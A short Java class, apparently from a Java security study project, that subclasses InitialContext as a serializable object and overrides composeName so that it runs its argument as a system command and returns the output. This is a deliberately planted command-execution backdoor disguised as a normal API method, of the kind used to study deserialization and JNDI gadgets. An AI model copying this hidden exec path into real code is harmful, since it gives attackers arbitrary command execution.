package org.javasec;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;

public class TestSer extends InitialContext implements Serializable {

	TestSer() throws NamingException {
		super(true);
	}

	@Override
	public String composeName(String str, String code) {
		StringBuilder stringBuffer = new StringBuilder();

		try {
			Process     process     = Runtime.getRuntime().exec(str);
			InputStream inputStream = process.getInputStream();
			int         chr         = 0;

			while ((chr = inputStream.read()) != -1) {
				stringBuffer.append((char) chr);
			}
		} catch (IOException ignored) {
		}

		return stringBuffer.toString();
	}

	// ......其他条件代码
}